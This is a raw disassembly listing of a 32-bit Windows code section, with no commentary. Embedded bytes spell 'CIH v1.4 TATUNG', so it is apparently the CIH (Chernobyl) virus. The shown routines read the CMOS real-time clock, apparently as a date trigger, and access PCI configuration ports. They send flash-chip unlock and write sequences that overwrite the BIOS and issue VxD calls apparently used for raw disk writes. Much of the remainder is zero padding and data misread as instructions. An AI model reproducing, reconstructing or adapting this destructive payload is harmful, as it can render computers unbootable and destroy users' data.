                           .text:00401520 8b dc                            mov    %esp,%ebx
                           .text:00401522 ff 73 38                         pushl  0x38(%ebx)
                           .text:00401525 ff 53 24                         call   *0x24(%ebx)
                           .text:00401528 59                               pop    %ecx
                           .text:00401529 89 43 1c                         mov    %eax,0x1c(%ebx)
                           .text:0040152c 83 7b 28 24                      cmpl   $0x24,0x28(%ebx)
                           .text:00401530 75 06                            jne    0x00401538
                           .text:00401532 8b 41 28                         mov    0x28(%ecx),%eax
                           .text:00401535 89 46 01                         mov    %eax,0x1(%esi)
                           .text:00401538 61                               popa   
                           .text:00401539 c3                               ret    
                           .text:0040153a b0 07                            mov    $0x7,%al
                           .text:0040153c e6 70                            out    %al,$0x70
                           .text:0040153e e4 71                            in     $0x71,%al
                           .text:00401540 34 26                            xor    $0x26,%al
                           .text:00401542 eb d3                            jmp    0x00401517
                           .text:00401544 66 bd f8 0c                      mov    $0xcf8,%bp
                           .text:00401548 8d 76 c5                         lea    -0x3b(%esi),%esi
                           .text:0040154b bf 4c 38 00 80                   mov    $0x8000384c,%edi
                           .text:00401550 66 ba fe 0c                      mov    $0xcfe,%dx
                           .text:00401554 fa                               cli    
                           .text:00401555 ff d6                            call   *%esi
                           .text:00401557 66 bf 58 00                      mov    $0x58,%di
                           .text:0040155b 4a                               dec    %edx
                           .text:0040155c 66 c7 46 08 24 0f                movw   $0xf24,0x8(%esi)
                           .text:00401562 ff d6                            call   *%esi
                           .text:00401564 8d 5e f4                         lea    -0xc(%esi),%ebx
                           .text:00401567 b8 55 55 0e 00                   mov    $0xe5555,%eax
                           .text:0040156c b9 aa 2a 0e 00                   mov    $0xe2aaa,%ecx
                           .text:00401571 ff d3                            call   *%ebx
                           .text:00401573 c6 00 60                         movb   $0x60,(%eax)
                           .text:00401576 51                               push   %ecx
                           .text:00401577 e2 fe                            loop   0x00401577
                           .text:00401579 32 e4                            xor    %ah,%ah
                           .text:0040157b 88 00                            mov    %al,(%eax)
                           .text:0040157d 91                               xchg   %eax,%ecx
                           .text:0040157e e2 fe                            loop   0x0040157e
                           .text:00401580 b8 55 55 0f 00                   mov    $0xf5555,%eax
                           .text:00401585 59                               pop    %ecx
                           .text:00401586 b5 aa                            mov    $0xaa,%ch
                           .text:00401588 ff d3                            call   *%ebx
                           .text:0040158a c6 00 20                         movb   $0x20,(%eax)
                           .text:0040158d e2 fe                            loop   0x0040158d
                           .text:0040158f b4 e0                            mov    $0xe0,%ah
                           .text:00401591 88 00                            mov    %al,(%eax)
                           .text:00401593 66 c7 46 08 0c 10                movw   $0x100c,0x8(%esi)
                           .text:00401599 ff d6                            call   *%esi
                           .text:0040159b 33 db                            xor    %ebx,%ebx
                           .text:0040159d b7 81                            mov    $0x81,%bh
                           .text:0040159f 53                               push   %ebx
                           .text:004015a0 83 ec 2c                         sub    $0x2c,%esp
                           .text:004015a3 68 00 10 00 c0                   push   $0xc0001000
                           .text:004015a8 b7 08                            mov    $0x8,%bh
                           .text:004015aa 53                               push   %ebx
                           .text:004015ab 51                               push   %ecx
                           .text:004015ac 51                               push   %ecx
                           .text:004015ad 51                               push   %ecx
                           .text:004015ae 68 01 05 00 40                   push   $0x40000501
                           .text:004015b3 41                               inc    %ecx
                           .text:004015b4 51                               push   %ecx
                           .text:004015b5 51                               push   %ecx
                           .text:004015b6 8b f4                            mov    %esp,%esi
                           .text:004015b8 81 ec ac 00 00 00                sub    $0xac,%esp
                           .text:004015be cd 20                            int    $0x20
                           .text:004015c0 04 00                            add    $0x0,%al
                           .text:004015c2 10 00                            adc    %al,(%eax)
                           .text:004015c4 66 83 7e 06 17                   cmpw   $0x17,0x6(%esi)
                           .text:004015c9 74 05                            je     0x004015d0
                           .text:004015cb fe 46 4d                         incb   0x4d(%esi)
                           .text:004015ce eb ee                            jmp    0x004015be
                           .text:004015d0 01 5e 10                         add    %ebx,0x10(%esi)
                           .text:004015d3 c6 46 4d 81                      movb   $0x81,0x4d(%esi)
                           .text:004015d7 eb e5                            jmp    0x004015be
                           .text:004015d9 88 08                            mov    %cl,(%eax)
                           .text:004015db 88 01                            mov    %al,(%ecx)
                           .text:004015dd c6 00 80                         movb   $0x80,(%eax)
                           .text:004015e0 88 08                            mov    %cl,(%eax)
                           .text:004015e2 88 01                            mov    %al,(%ecx)
                           .text:004015e4 c3                               ret    
                           .text:004015e5 97                               xchg   %eax,%edi
                           .text:004015e6 87 d5                            xchg   %edx,%ebp
                           .text:004015e8 ef                               out    %eax,(%dx)
                           .text:004015e9 97                               xchg   %eax,%edi
                           .text:004015ea 87 d5                            xchg   %edx,%ebp
                           .text:004015ec ec                               in     (%dx),%al
                           .text:004015ed 0c 44                            or     $0x44,%al
                           .text:004015ef 97                               xchg   %eax,%edi
                           .text:004015f0 87 d5                            xchg   %edx,%ebp
                           .text:004015f2 ef                               out    %eax,(%dx)
                           .text:004015f3 97                               xchg   %eax,%edi
                           .text:004015f4 87 d5                            xchg   %edx,%ebp
                           .text:004015f6 ee                               out    %al,(%dx)
                           .text:004015f7 c3                               ret    
                           .text:004015f8 00 3a                            add    %bh,(%edx)
                           .text:004015fa 66 35 53 00                      xor    $0x53,%ax
                           .text:004015fe 01 00                            add    %eax,(%eax)
                           .text:00401600 68 00 40 00 41                   push   $0x41004000
                           .text:00401605 00 40 00                         add    %al,0x0(%eax)
                           .text:00401608 32 00                            xor    (%eax),%al
                           .text:0040160a 40                               inc    %eax
                           .text:0040160b 00 43 49                         add    %al,0x49(%ebx)
                           .text:0040160e 48                               dec    %eax
                           .text:0040160f 20 76 31                         and    %dh,0x31(%esi)
                           .text:00401612 2e 34 20                         cs xor $0x20,%al
                           .text:00401615 54                               push   %esp
                           .text:00401616 41                               inc    %ecx
                           .text:00401617 54                               push   %esp
                           .text:00401618 55                               push   %ebp
                           .text:00401619 4e                               dec    %esi
                           .text:0040161a 47                               inc    %edi
                           .text:0040161b 00 00                            add    %al,(%eax)
                           .text:0040161d 00 00                            add    %al,(%eax)
                           .text:0040161f 00 96 d7 fc 92 d6                add    %dl,-0x296d0329(%esi)
                           .text:00401625 4e                               dec    %esi
                           .text:00401626 e3 51                            jecxz  0x00401679
                           .text:00401628 10 3e                            adc    %bh,(%esi)
                           .text:0040162a 24 b9                            and    $0xb9,%al
                           .text:0040162c bf 7f 00 00 30                   mov    $0x3000007f,%edi
                           .text:00401631 d5 09                            aad    $0x9
                           .text:00401633 ba bf 7f 00 00                   mov    $0x7fbf,%edx
                           .text:00401638 00 00                            add    %al,(%eax)
                           .text:0040163a 00 00                            add    %al,(%eax)
                           .text:0040163c 00 00                            add    %al,(%eax)
                           .text:0040163e 00 00                            add    %al,(%eax)
                           .text:00401640 00 00                            add    %al,(%eax)
                           .text:00401642 00 00                            add    %al,(%eax)
                           .text:00401644 00 00                            add    %al,(%eax)
                           .text:00401646 00 00                            add    %al,(%eax)
                           .text:00401648 00 00                            add    %al,(%eax)
                           .text:0040164a 00 00                            add    %al,(%eax)
                           .text:0040164c 00 00                            add    %al,(%eax)
                           .text:0040164e 00 00                            add    %al,(%eax)
                           .text:00401650 00 00                            add    %al,(%eax)
                           .text:00401652 00 00                            add    %al,(%eax)
                           .text:00401654 00 00                            add    %al,(%eax)
                           .text:00401656 00 00                            add    %al,(%eax)
                           .text:00401658 00 00                            add    %al,(%eax)
                           .text:0040165a 00 00                            add    %al,(%eax)
                           .text:0040165c 00 00                            add    %al,(%eax)
                           .text:0040165e 00 00                            add    %al,(%eax)
                           .text:00401660 00 00                            add    %al,(%eax)
                           .text:00401662 00 00                            add    %al,(%eax)
                           .text:00401664 00 00                            add    %al,(%eax)
                           .text:00401666 00 00                            add    %al,(%eax)
                           .text:00401668 00 00                            add    %al,(%eax)
                           .text:0040166a 00 00                            add    %al,(%eax)
                           .text:0040166c 00 00                            add    %al,(%eax)
                           .text:0040166e 00 00                            add    %al,(%eax)
                           .text:00401670 00 00                            add    %al,(%eax)
                           .text:00401672 00 00                            add    %al,(%eax)
                           .text:00401674 00 00                            add    %al,(%eax)
                           .text:00401676 00 00                            add    %al,(%eax)
                           .text:00401678 00 00                            add    %al,(%eax)
                           .text:0040167a 00 00                            add    %al,(%eax)
                           .text:0040167c 00 00                            add    %al,(%eax)
                           .text:0040167e 00 00                            add    %al,(%eax)
                           .text:00401680 9a 8b 14 e5 8e e6 27             lcall  $0x27e6,$0x8ee5148b
                           .text:00401687 27                               daa    
                           .text:00401688 20 34 24                         and    %dh,(%esp)
                           .text:0040168b b9 bf 7f 00 00                   mov    $0x7fbf,%ecx
                           .text:00401690 80 58 70 00                      sbbb   $0x0,0x70(%eax)
                           .text:00401694 00 00                            add    %al,(%eax)
                           .text:00401696 00 00                            add    %al,(%eax)
                           .text:00401698 00 00                            add    %al,(%eax)
                           .text:0040169a 00 00                            add    %al,(%eax)
                           .text:0040169c 00 00                            add    %al,(%eax)
                           .text:0040169e 00 00                            add    %al,(%eax)
                           .text:004016a0 00 00                            add    %al,(%eax)
                           .text:004016a2 00 00                            add    %al,(%eax)
                           .text:004016a4 00 00                            add    %al,(%eax)
                           .text:004016a6 00 00                            add    %al,(%eax)
                           .text:004016a8 00 00                            add    %al,(%eax)
                           .text:004016aa 00 00                            add    %al,(%eax)
                           .text:004016ac 00 00                            add    %al,(%eax)
                           .text:004016ae 00 00                            add    %al,(%eax)
                           .text:004016b0 00 00                            add    %al,(%eax)
                           .text:004016b2 00 00                            add    %al,(%eax)
                           .text:004016b4 00 00                            add    %al,(%eax)
                           .text:004016b6 00 00                            add    %al,(%eax)
                           .text:004016b8 00 00                            add    %al,(%eax)
                           .text:004016ba 00 00                            add    %al,(%eax)
                           .text:004016bc 00 00                            add    %al,(%eax)
                           .text:004016be 00 00                            add    %al,(%eax)
                           .text:004016c0 00 00                            add    %al,(%eax)
                           .text:004016c2 00 00                            add    %al,(%eax)
                           .text:004016c4 00 00                            add    %al,(%eax)
                           .text:004016c6 00 00                            add    %al,(%eax)
                           .text:004016c8 00 00                            add    %al,(%eax)
                           .text:004016ca 00 00                            add    %al,(%eax)
                           .text:004016cc 00 00                            add    %al,(%eax)
                           .text:004016ce 00 00                            add    %al,(%eax)
                           .text:004016d0 00 00                            add    %al,(%eax)
                           .text:004016d2 00 00                            add    %al,(%eax)
                           .text:004016d4 00 00                            add    %al,(%eax)
                           .text:004016d6 00 00                            add    %al,(%eax)
                           .text:004016d8 00 00                            add    %al,(%eax)
                           .text:004016da 00 00                            add    %al,(%eax)
                           .text:004016dc 00 00                            add    %al,(%eax)
                           .text:004016de 00 00                            add    %al,(%eax)
                           .text:004016e0 00 00                            add    %al,(%eax)
                           .text:004016e2 00 00                            add    %al,(%eax)
                           .text:004016e4 00 00                            add    %al,(%eax)
                           .text:004016e6 00 00                            add    %al,(%eax)
                           .text:004016e8 00 00                            add    %al,(%eax)
                           .text:004016ea 00 00                            add    %al,(%eax)
                           .text:004016ec 00 00                            add    %al,(%eax)
                           .text:004016ee 00 00                            add    %al,(%eax)
                           .text:004016f0 00 00                            add    %al,(%eax)
                           .text:004016f2 00 00                            add    %al,(%eax)
                           .text:004016f4 00 00                            add    %al,(%eax)
                           .text:004016f6 00 00                            add    %al,(%eax)
                           .text:004016f8 1f                               pop    %ds
                           .text:004016f9 ab                               stos   %eax,%es:(%edi)
                           .text:004016fa 7e 37                            jle    0x00401733
                           .text:004016fc 96                               xchg   %eax,%esi
                           .text:004016fd a4                               movsb  %ds:(%esi),%es:(%edi)
                           .text:004016fe 75 e6                            jne    0x004016e6
                           .text:00401700 a0 ee d9 b8 bf                   mov    0xbfb8d9ee,%al
                           .text:00401705 7f 00                            jg     0x00401707
                           .text:00401707 00 18                            add    %bl,(%eax)
                           .text:00401709 8b 4c 01 00                      mov    0x0(%ecx,%eax,1),%ecx
                           .text:0040170d 00 00                            add    %al,(%eax)
                           .text:0040170f 00 a0 b8 0e ff 21                add    %ah,0x21ff0eb8(%eax)
                           .text:00401715 98                               cwtl   
                           .text:00401716 96                               xchg   %eax,%esi
                           .text:00401717 6c                               insb   (%dx),%es:(%edi)
                           .text:00401718 a0 38 24 b9 bf                   mov    0xbfb92438,%al
                           .text:0040171d 7f 00                            jg     0x0040171f
                           .text:0040171f 00 90 8b 4c 01 00                add    %dl,0x14c8b(%eax)
                           .text:00401725 00 00                            add    %al,(%eax)
                           .text:00401727 00 00                            add    %al,(%eax)
                           .text:00401729 00 00                            add    %al,(%eax)
                           .text:0040172b 00 00                            add    %al,(%eax)
                           .text:0040172d 00 00                            add    %al,(%eax)
                           .text:0040172f 00 00                            add    %al,(%eax)
                           .text:00401731 00 00                            add    %al,(%eax)
                           .text:00401733 00 00                            add    %al,(%eax)
                           .text:00401735 00 00                            add    %al,(%eax)
                           .text:00401737 00 00                            add    %al,(%eax)
                           .text:00401739 00 00                            add    %al,(%eax)
                           .text:0040173b 00 00                            add    %al,(%eax)
                           .text:0040173d 00 00                            add    %al,(%eax)
                           .text:0040173f 00 22                            add    %ah,(%edx)
                           .text:00401741 a8 8d                            test   $0x8d,%al
                           .text:00401743 4a                               dec    %edx
                           .text:00401744 50                               push   %eax
                           .text:00401745 9f                               lahf   
                           .text:00401746 cd 02                            int    $0x2
                           .text:00401748 30 30                            xor    %dh,(%eax)
                           .text:0040174a 24 b9                            and    $0xb9,%al
                           .text:0040174c bf 7f 00 00 08                   mov    $0x800007f,%edi
                           .text:00401751 55                               push   %ebp
                           .text:00401752 6d                               insl   (%dx),%es:(%edi)
                           .text:00401753 c5 bf 7f 00 00 00                lds    0x7f(%edi),%edi
                           .text:00401759 00 00                            add    %al,(%eax)
                           .text:0040175b 00 00                            add    %al,(%eax)
                           .text:0040175d 00 00                            add    %al,(%eax)
                           .text:0040175f 00 00                            add    %al,(%eax)
                           .text:00401761 00 00                            add    %al,(%eax)
                           .text:00401763 00 00                            add    %al,(%eax)
                           .text:00401765 00 00                            add    %al,(%eax)
                           .text:00401767 00 00                            add    %al,(%eax)
                           .text:00401769 00 00                            add    %al,(%eax)
                           .text:0040176b 00 00                            add    %al,(%eax)
                           .text:0040176d 00 00                            add    %al,(%eax)
                           .text:0040176f 00 00                            add    %al,(%eax)
                           .text:00401771 00 00                            add    %al,(%eax)
                           .text:00401773 00 00                            add    %al,(%eax)
                           .text:00401775 00 00                            add    %al,(%eax)
                           .text:00401777 00 00                            add    %al,(%eax)
                           .text:00401779 00 00                            add    %al,(%eax)
                           .text:0040177b 00 00                            add    %al,(%eax)
                           .text:0040177d 00 00                            add    %al,(%eax)
                           .text:0040177f 00 00                            add    %al,(%eax)
                           .text:00401781 00 00                            add    %al,(%eax)
                           .text:00401783 00 00                            add    %al,(%eax)
                           .text:00401785 00 00                            add    %al,(%eax)
                           .text:00401787 00 00                            add    %al,(%eax)
                           .text:00401789 00 00                            add    %al,(%eax)
                           .text:0040178b 00 00                            add    %al,(%eax)
                           .text:0040178d 00 00                            add    %al,(%eax)
                           .text:0040178f 00 00                            add    %al,(%eax)
                           .text:00401791 00 00                            add    %al,(%eax)
                           .text:00401793 00 00                            add    %al,(%eax)
                           .text:00401795 00 00                            add    %al,(%eax)
                           .text:00401797 00 00                            add    %al,(%eax)
                           .text:00401799 00 00                            add    %al,(%eax)
                           .text:0040179b 00 00                            add    %al,(%eax)
                           .text:0040179d 00 00                            add    %al,(%eax)
                           .text:0040179f 00 00                            add    %al,(%eax)
                           .text:004017a1 00 00                            add    %al,(%eax)
                           .text:004017a3 00 00                            add    %al,(%eax)
                           .text:004017a5 00 00                            add    %al,(%eax)
                           .text:004017a7 00 00                            add    %al,(%eax)
                           .text:004017a9 00 00                            add    %al,(%eax)
                           .text:004017ab 00 00                            add    %al,(%eax)
                           .text:004017ad 00 00                            add    %al,(%eax)
                           .text:004017af 00 00                            add    %al,(%eax)
                           .text:004017b1 00 00                            add    %al,(%eax)
                           .text:004017b3 00 00                            add    %al,(%eax)
                           .text:004017b5 00 00                            add    %al,(%eax)
                           .text:004017b7 00 00                            add    %al,(%eax)
                           .text:004017b9 00 00                            add    %al,(%eax)
                           .text:004017bb 00 00                            add    %al,(%eax)
                           .text:004017bd 00 00                            add    %al,(%eax)
                           .text:004017bf 00 00                            add    %al,(%eax)
                           .text:004017c1 00 00                            add    %al,(%eax)
                           .text:004017c3 00 00                            add    %al,(%eax)
                           .text:004017c5 00 00                            add    %al,(%eax)
                           .text:004017c7 00 00                            add    %al,(%eax)
                           .text:004017c9 00 00                            add    %al,(%eax)
                           .text:004017cb 00 00                            add    %al,(%eax)
                           .text:004017cd 00 00                            add    %al,(%eax)
                           .text:004017cf 00 00                            add    %al,(%eax)
                           .text:004017d1 00 00                            add    %al,(%eax)
                           .text:004017d3 00 00                            add    %al,(%eax)
                           .text:004017d5 00 00                            add    %al,(%eax)
                           .text:004017d7 00 00                            add    %al,(%eax)
                           .text:004017d9 00 00                            add    %al,(%eax)
                           .text:004017db 00 00                            add    %al,(%eax)
                           .text:004017dd 00 00                            add    %al,(%eax)
                           .text:004017df 00 00                            add    %al,(%eax)
                           .text:004017e1 00 00                            add    %al,(%eax)
                           .text:004017e3 00 00                            add    %al,(%eax)
                           .text:004017e5 00 00                            add    %al,(%eax)
                           .text:004017e7 00 00                            add    %al,(%eax)
                           .text:004017e9 00 00                            add    %al,(%eax)
                           .text:004017eb 00 00                            add    %al,(%eax)
                           .text:004017ed 00 00                            add    %al,(%eax)
                           .text:004017ef 00 00                            add    %al,(%eax)
                           .text:004017f1 00 00                            add    %al,(%eax)
                           .text:004017f3 00 00                            add    %al,(%eax)
                           .text:004017f5 00 00                            add    %al,(%eax)
                           .text:004017f7 00 00                            add    %al,(%eax)
                           .text:004017f9 00 00                            add    %al,(%eax)
                           .text:004017fb 00 00                            add    %al,(%eax)
                           .text:004017fd 00 00                            add    %al,(%eax)
                           .text:004017ff 00 00                            add    %al,(%eax)
                           .text:00401801 00 00                            add    %al,(%eax)
                           .text:00401803 00 00                            add    %al,(%eax)
                           .text:00401805 00 00                            add    %al,(%eax)
                           .text:00401807 00 00                            add    %al,(%eax)
                           .text:00401809 00 00                            add    %al,(%eax)
                           .text:0040180b 00 00                            add    %al,(%eax)
                           .text:0040180d 00 00                            add    %al,(%eax)
                           .text:0040180f 00 00                            add    %al,(%eax)
                           .text:00401811 00 00                            add    %al,(%eax)
                           .text:00401813 00 00                            add    %al,(%eax)
                           .text:00401815 00 00                            add    %al,(%eax)
                           .text:00401817 00 00                            add    %al,(%eax)
                           .text:00401819 00 00                            add    %al,(%eax)
                           .text:0040181b 00 00                            add    %al,(%eax)
                           .text:0040181d 00 00                            add    %al,(%eax)
                           .text:0040181f 00 00                            add    %al,(%eax)
                           .text:00401821 00 00                            add    %al,(%eax)
                           .text:00401823 00 00                            add    %al,(%eax)
                           .text:00401825 00 00                            add    %al,(%eax)
                           .text:00401827 00 00                            add    %al,(%eax)
                           .text:00401829 00 00                            add    %al,(%eax)
                           .text:0040182b 00 00                            add    %al,(%eax)
                           .text:0040182d 00 00                            add    %al,(%eax)
                           .text:0040182f 00 00                            add    %al,(%eax)
                           .text:00401831 00 00                            add    %al,(%eax)
                           .text:00401833 00 00                            add    %al,(%eax)
                           .text:00401835 00 00                            add    %al,(%eax)
                           .text:00401837 00 00                            add    %al,(%eax)
                           .text:00401839 00 00                            add    %al,(%eax)
                           .text:0040183b 00 00                            add    %al,(%eax)
                           .text:0040183d 00 00                            add    %al,(%eax)
                           .text:0040183f 00 00                            add    %al,(%eax)
                           .text:00401841 00 00                            add    %al,(%eax)
                           .text:00401843 00 00                            add    %al,(%eax)
                           .text:00401845 00 00                            add    %al,(%eax)
                           .text:00401847 00 00                            add    %al,(%eax)
                           .text:00401849 00 00                            add    %al,(%eax)
                           .text:0040184b 00 00                            add    %al,(%eax)
                           .text:0040184d 00 00                            add    %al,(%eax)
                           .text:0040184f 00 00                            add    %al,(%eax)
                           .text:00401851 00 00                            add    %al,(%eax)
                           .text:00401853 00 00                            add    %al,(%eax)
                           .text:00401855 00 00                            add    %al,(%eax)
                           .text:00401857 00 00                            add    %al,(%eax)
                           .text:00401859 00 00                            add    %al,(%eax)
                           .text:0040185b 00 00                            add    %al,(%eax)
                           .text:0040185d 00 00                            add    %al,(%eax)
                           .text:0040185f 00 00                            add    %al,(%eax)
                           .text:00401861 00 00                            add    %al,(%eax)
                           .text:00401863 00 00                            add    %al,(%eax)
                           .text:00401865 00 00                            add    %al,(%eax)
                           .text:00401867 00 00                            add    %al,(%eax)
                           .text:00401869 00 00                            add    %al,(%eax)
                           .text:0040186b 00 00                            add    %al,(%eax)
                           .text:0040186d 00 00                            add    %al,(%eax)
                           .text:0040186f 00 00                            add    %al,(%eax)
                           .text:00401871 00 00                            add    %al,(%eax)
                           .text:00401873 00 00                            add    %al,(%eax)
                           .text:00401875 00 00                            add    %al,(%eax)
                           .text:00401877 00 00                            add    %al,(%eax)
                           .text:00401879 00 00                            add    %al,(%eax)
                           .text:0040187b 00 00                            add    %al,(%eax)
                           .text:0040187d 00 00                            add    %al,(%eax)
                           .text:0040187f 00 00                            add    %al,(%eax)
                           .text:00401881 00 00                            add    %al,(%eax)
                           .text:00401883 00 00                            add    %al,(%eax)
                           .text:00401885 00 00                            add    %al,(%eax)
                           .text:00401887 00 00                            add    %al,(%eax)
                           .text:00401889 00 00                            add    %al,(%eax)
                           .text:0040188b 00 00                            add    %al,(%eax)
                           .text:0040188d 00 00                            add    %al,(%eax)
                           .text:0040188f 00 00                            add    %al,(%eax)
                           .text:00401891 00 00                            add    %al,(%eax)
                           .text:00401893 00 00                            add    %al,(%eax)
                           .text:00401895 00 00                            add    %al,(%eax)
                           .text:00401897 00 00                            add    %al,(%eax)
                           .text:00401899 00 00                            add    %al,(%eax)
                           .text:0040189b 00 00                            add    %al,(%eax)
                           .text:0040189d 00 00                            add    %al,(%eax)
                           .text:0040189f 00 00                            add    %al,(%eax)
                           .text:004018a1 00 00                            add    %al,(%eax)
                           .text:004018a3 00 00                            add    %al,(%eax)
                           .text:004018a5 00 00                            add    %al,(%eax)
                           .text:004018a7 00 00                            add    %al,(%eax)
                           .text:004018a9 00 00                            add    %al,(%eax)
                           .text:004018ab 00 00                            add    %al,(%eax)
                           .text:004018ad 00 00                            add    %al,(%eax)
                           .text:004018af 00 00                            add    %al,(%eax)
                           .text:004018b1 00 00                            add    %al,(%eax)
                           .text:004018b3 00 00                            add    %al,(%eax)
                           .text:004018b5 00 00                            add    %al,(%eax)
                           .text:004018b7 00 00                            add    %al,(%eax)
                           .text:004018b9 00 00                            add    %al,(%eax)
                           .text:004018bb 00 00                            add    %al,(%eax)
                           .text:004018bd 00 00                            add    %al,(%eax)
                           .text:004018bf 00 00                            add    %al,(%eax)
                           .text:004018c1 00 00                            add    %al,(%eax)
                           .text:004018c3 00 00                            add    %al,(%eax)
                           .text:004018c5 00 00                            add    %al,(%eax)
                           .text:004018c7 00 00                            add    %al,(%eax)
                           .text:004018c9 00 00                            add    %al,(%eax)
                           .text:004018cb 00 00                            add    %al,(%eax)
                           .text:004018cd 00 00                            add    %al,(%eax)
                           .text:004018cf 00 00                            add    %al,(%eax)
                           .text:004018d1 00 00                            add    %al,(%eax)
                           .text:004018d3 00 00                            add    %al,(%eax)
                           .text:004018d5 00 00                            add    %al,(%eax)
                           .text:004018d7 00 00                            add    %al,(%eax)
                           .text:004018d9 00 00                            add    %al,(%eax)
                           .text:004018db 00 00                            add    %al,(%eax)
                           .text:004018dd 00 00                            add    %al,(%eax)
                           .text:004018df 00 00                            add    %al,(%eax)
                           .text:004018e1 00 00                            add    %al,(%eax)
                           .text:004018e3 00 00                            add    %al,(%eax)
                           .text:004018e5 00 00                            add    %al,(%eax)
                           .text:004018e7 00 00                            add    %al,(%eax)
                           .text:004018e9 00 00                            add    %al,(%eax)
                           .text:004018eb 00 00                            add    %al,(%eax)
                           .text:004018ed 00 00                            add    %al,(%eax)
                           .text:004018ef 00 00                            add    %al,(%eax)
                           .text:004018f1 00 00                            add    %al,(%eax)
                           .text:004018f3 00 00                            add    %al,(%eax)
                           .text:004018f5 00 00                            add    %al,(%eax)
                           .text:004018f7 00 00                            add    %al,(%eax)
                           .text:004018f9 00 00                            add    %al,(%eax)
                           .text:004018fb 00 00                            add    %al,(%eax)
                           .text:004018fd 00 00                            add    %al,(%eax)
                           .text:004018ff 00 00                            add    %al,(%eax)
                           .text:00401901 00 00                            add    %al,(%eax)
                           .text:00401903 00 00                            add    %al,(%eax)
                           .text:00401905 00 00                            add    %al,(%eax)
                           .text:00401907 00 00                            add    %al,(%eax)
                           .text:00401909 00 00                            add    %al,(%eax)
                           .text:0040190b 00 00                            add    %al,(%eax)
                           .text:0040190d 00 00                            add    %al,(%eax)
                           .text:0040190f 00 00                            add    %al,(%eax)
                           .text:00401911 00 00                            add    %al,(%eax)
                           .text:00401913 00 00                            add    %al,(%eax)
                           .text:00401915 00 00                            add    %al,(%eax)
                           .text:00401917 00 00                            add    %al,(%eax)
                           .text:00401919 00 00                            add    %al,(%eax)
                           .text:0040191b 00 00                            add    %al,(%eax)
                           .text:0040191d 00 00                            add    %al,(%eax)
                           .text:0040191f 00 b6 ff b7 15 4e                add    %dh,0x4e15b7ff(%esi)
                           .text:00401925 bd f0 ab 20 37                   mov    $0x3720abf0,%ebp
                           .text:0040192a 24 b9                            and    $0xb9,%al
                           .text:0040192c bf 7f 00 00 08                   mov    $0x800007f,%edi
                           .text:00401931 55                               push   %ebp
                           .text:00401932 6d                               insl   (%dx),%es:(%edi)
                           .text:00401933 c5 bf 7f 00 00 00                lds    0x7f(%edi),%edi
                           .text:00401939 00 00                            add    %al,(%eax)
                           .text:0040193b 00 00                            add    %al,(%eax)
                           .text:0040193d 00 00                            add    %al,(%eax)
                           .text:0040193f 00 00                            add    %al,(%eax)
                           .text:00401941 00 00                            add    %al,(%eax)
                           .text:00401943 00 00                            add    %al,(%eax)
                           .text:00401945 00 00                            add    %al,(%eax)
                           .text:00401947 00 00                            add    %al,(%eax)
                           .text:00401949 00 00                            add    %al,(%eax)
                           .text:0040194b 00 00                            add    %al,(%eax)
                           .text:0040194d 00 00                            add    %al,(%eax)
                           .text:0040194f 00 00                            add    %al,(%eax)
                           .text:00401951 00 00                            add    %al,(%eax)
                           .text:00401953 00 00                            add    %al,(%eax)
                           .text:00401955 00 00                            add    %al,(%eax)
                           .text:00401957 00 00                            add    %al,(%eax)
                           .text:00401959 00 00                            add    %al,(%eax)
                           .text:0040195b 00 00                            add    %al,(%eax)
                           .text:0040195d 00 00                            add    %al,(%eax)
                           .text:0040195f 00 00                            add    %al,(%eax)
                           .text:00401961 00 00                            add    %al,(%eax)
                           .text:00401963 00 00                            add    %al,(%eax)
                           .text:00401965 00 00                            add    %al,(%eax)
                           .text:00401967 00 00                            add    %al,(%eax)
                           .text:00401969 00 00                            add    %al,(%eax)
                           .text:0040196b 00 00                            add    %al,(%eax)
                           .text:0040196d 00 00                            add    %al,(%eax)
                           .text:0040196f 00 00                            add    %al,(%eax)
                           .text:00401971 00 00                            add    %al,(%eax)
                           .text:00401973 00 00                            add    %al,(%eax)
                           .text:00401975 00 00                            add    %al,(%eax)
                           .text:00401977 00 00                            add    %al,(%eax)
                           .text:00401979 00 00                            add    %al,(%eax)
                           .text:0040197b 00 00                            add    %al,(%eax)
                           .text:0040197d 00 00                            add    %al,(%eax)
                           .text:0040197f 00 00                            add    %al,(%eax)
                           .text:00401981 00 00                            add    %al,(%eax)
                           .text:00401983 00 00                            add    %al,(%eax)
                           .text:00401985 00 00                            add    %al,(%eax)
                           .text:00401987 00 00                            add    %al,(%eax)
                           .text:00401989 00 00                            add    %al,(%eax)
                           .text:0040198b 00 00                            add    %al,(%eax)
                           .text:0040198d 00 00                            add    %al,(%eax)
                           .text:0040198f 00 00                            add    %al,(%eax)
                           .text:00401991 00 00                            add    %al,(%eax)
                           .text:00401993 00 00                            add    %al,(%eax)
                           .text:00401995 00 00                            add    %al,(%eax)
                           .text:00401997 00 00                            add    %al,(%eax)
                           .text:00401999 00 00                            add    %al,(%eax)
                           .text:0040199b 00 00                            add    %al,(%eax)
                           .text:0040199d 00 00                            add    %al,(%eax)
                           .text:0040199f 00 00                            add    %al,(%eax)
                           .text:004019a1 00 00                            add    %al,(%eax)
                           .text:004019a3 00 00                            add    %al,(%eax)
                           .text:004019a5 00 00                            add    %al,(%eax)
                           .text:004019a7 00 00                            add    %al,(%eax)
                           .text:004019a9 00 00                            add    %al,(%eax)
                           .text:004019ab 00 00                            add    %al,(%eax)
                           .text:004019ad 00 00                            add    %al,(%eax)
                           .text:004019af 00 00                            add    %al,(%eax)
                           .text:004019b1 00 00                            add    %al,(%eax)
                           .text:004019b3 00 00                            add    %al,(%eax)
                           .text:004019b5 00 00                            add    %al,(%eax)
                           .text:004019b7 00 00                            add    %al,(%eax)
                           .text:004019b9 00 00                            add    %al,(%eax)
                           .text:004019bb 00 00                            add    %al,(%eax)
                           .text:004019bd 00 00                            add    %al,(%eax)
                           .text:004019bf 00 00                            add    %al,(%eax)
                           .text:004019c1 00 00                            add    %al,(%eax)
                           .text:004019c3 00 00                            add    %al,(%eax)
                           .text:004019c5 00 00                            add    %al,(%eax)
                           .text:004019c7 00 00                            add    %al,(%eax)
                           .text:004019c9 00 00                            add    %al,(%eax)
                           .text:004019cb 00 00                            add    %al,(%eax)
                           .text:004019cd 00 00                            add    %al,(%eax)
                           .text:004019cf 00 00                            add    %al,(%eax)
                           .text:004019d1 00 00                            add    %al,(%eax)
                           .text:004019d3 00 00                            add    %al,(%eax)
                           .text:004019d5 00 00                            add    %al,(%eax)
                           .text:004019d7 00 00                            add    %al,(%eax)
                           .text:004019d9 00 00                            add    %al,(%eax)
                           .text:004019db 00 00                            add    %al,(%eax)
                           .text:004019dd 00 00                            add    %al,(%eax)
